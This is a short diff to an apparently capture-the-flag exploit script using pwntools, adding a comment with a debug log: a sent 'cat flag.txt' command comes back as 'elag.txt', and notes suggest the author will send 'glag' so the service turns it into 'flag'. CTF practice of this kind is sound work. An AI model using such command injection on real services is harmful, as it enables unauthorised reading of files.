@@ -38,3 +38,16 @@ io.sendline(cmd)
 print(io.recvall())
 #io.interactive()
 
+'''
+flag -> elag
+glag -> flag
+
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[+] Receiving all data: Done (42B)
+[DEBUG] Received 0xd bytes:
+    b'cat: elag.txt'
+[DEBUG] Received 0x1c bytes:
+    b': No such file or directory\n'
+
+'''
